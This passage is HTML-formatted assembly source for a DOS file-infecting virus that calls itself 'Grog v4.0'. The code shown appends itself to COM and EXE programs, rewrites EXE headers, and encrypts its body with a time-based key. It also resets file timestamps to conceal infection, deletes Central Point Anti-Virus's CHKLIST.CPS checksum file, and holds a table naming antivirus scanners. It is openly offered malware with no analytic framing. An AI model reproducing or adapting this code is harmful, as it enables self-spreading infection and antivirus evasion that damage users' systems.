         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">100h</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Divide by paragraphs</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; AX = initial SS and CS relative ...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Subtract instruction pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack (DX)</span><span class="sc0">
</span><span class="sc5">calc_vir_ptr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; Calculate pointer to virus</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">calc_vir_ptr</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; DX = initial SS relative to star...</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_buffer</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">1036h</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_sof</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">      </span><span class="sc1">; Write eigthteen bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_rnd_num</span><span class="sc0">
</span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_pos</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Zero DX</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_sof</span><span class="sc0">
</span><span class="sc5">get_rnd_num</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">      </span><span class="sc1">; Get system time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; DH = encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">       </span><span class="sc1">; DH =       "            "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; DH =       "            "</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Invalid encryption/decryption key?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_rnd_num</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to get_rnd_num</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DI = offset of file_buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">decrypt_key</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">    </span><span class="sc1">; Store decryption key</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">code_begin</span><span class="sc0">   </span><span class="sc1">; SI = offset of code_begin</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">mov_code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">move_code</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Move hundred and fiftysix byte o...</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">move_code</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of plain code</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; Encrypt byte</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of encrypted code</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">        </span><span class="sc1">; Set file's date and time</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">del_chklist</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Delete CHKLIST.CPS</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">chklist_cps</span><span class="sc0">  </span><span class="sc1">; DX = offset of chklist_cps</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">int21_simula</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Simulate interrupt 21h</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">           </span><span class="sc1">; Save flags at stack</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">origin_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">terminate</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">  </span><span class="sc1">; Offset of original code of infec...</span><span class="sc0">
</span><span class="sc5">terminate</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">         </span><span class="sc1">; Terminate program</span><span class="sc0">

</span><span class="sc5">stdout_str</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Grog v4.0 is here!'</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' HaHaHa!'</span><span class="sc0">
</span><span class="sc5">stdout_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int13_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 13h</span><span class="sc0">
</span><span class="sc5">c__command_</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C:\COMMAND.'</span><span class="sc0">       </span><span class="sc1">; C:\COMMAND.COM</span><span class="sc0">
</span><span class="sc5">com_executab</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; COM executable</span><span class="sc0">
</span><span class="sc5">exe_executab</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; EXE executable</span><span class="sc0">
</span><span class="sc5">file_specifi</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; File specification</span><span class="sc0">
</span><span class="sc5">com_or_exe</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; COM or EXE executable</span><span class="sc0">
</span><span class="sc5">set_file_att</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">; Set file attributes</span><span class="sc0">
</span><span class="sc5">table_begin</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MBIO'</span><span class="sc0">              </span><span class="sc1">; IBMBIO.COM</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MDOS'</span><span class="sc0">              </span><span class="sc1">; IBMDOS.COM</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SCAN  '</span><span class="sc0">            </span><span class="sc1">; McAfee ViruScan</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CLEAN '</span><span class="sc0">            </span><span class="sc1">;   "       "</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'F-PROT'</span><span class="sc0">            </span><span class="sc1">; F-PROT</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CPAV  '</span><span class="sc0">            </span><span class="sc1">; Central Point Anti-Virus</span><span class="sc0">
</span><span class="sc5">table_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">chklist_cps</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CHKLIST.CPS'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">; Central Point Anti-Virus CRC fil...</span><span class="sc0">
</span><span class="sc5">file_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; EXE header</span><span class="sc0">
</span><span class="sc5">file_buffer</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 01h</span><span class="sc0">
</span><span class="sc5">crypt_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">code_end</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d58dh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">15h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Used by DOS for find next-process</span><span class="sc0">
</span><span class="sc5">file_attr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File attribute</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File time</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File date</span><span class="sc0">
</span><span class="sc5">filesize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Filesize</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; Filename</span><span class="sc0">
</span><span class="sc5">data_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">      </span><span class="sc5">code_begin</span><span class="sc0">
</span></div></body>
</html>
